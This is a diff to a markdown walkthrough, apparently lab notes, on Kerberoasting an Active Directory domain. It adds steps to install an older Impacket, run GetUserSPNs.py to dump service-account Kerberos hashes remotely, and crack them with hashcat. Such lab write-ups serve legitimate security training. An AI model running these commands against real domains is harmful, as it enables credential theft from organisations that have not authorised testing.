@@ -130,4 +130,14 @@ copy the hash onto your attacker machine and put it into a .txt file so we can c
 I have created a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)  
 3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash
 
-### 
+### Impacket Installation - 
+Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20  
+1.) cd /opt navigate to your preferred directory to save tools in  
+2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19  
+3.) cd Impacket-0.9.19 navigate to the impacket directory  
+4.) pip install . - this will install all needed dependencies
+
+### Kerberoasting w/ Impacket - 
+1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located  
+2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.  
+3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash
